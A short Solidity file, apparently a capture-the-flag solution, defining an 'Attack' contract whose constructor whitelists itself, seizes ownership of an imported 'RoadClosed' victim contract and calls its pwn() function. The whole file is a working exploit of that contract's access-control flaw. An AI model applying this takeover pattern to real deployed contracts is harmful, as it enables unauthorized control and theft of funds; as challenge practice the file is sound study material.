// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

import {RoadClosed} from "./victim.sol";

contract Attack {
    RoadClosed roadClosed;

    constructor(address addr) {
        roadClosed = RoadClosed(addr);
        roadClosed.addToWhitelist(address(this));
        roadClosed.changeOwner(address(this));
        roadClosed.pwn(address(this));
    }
    
}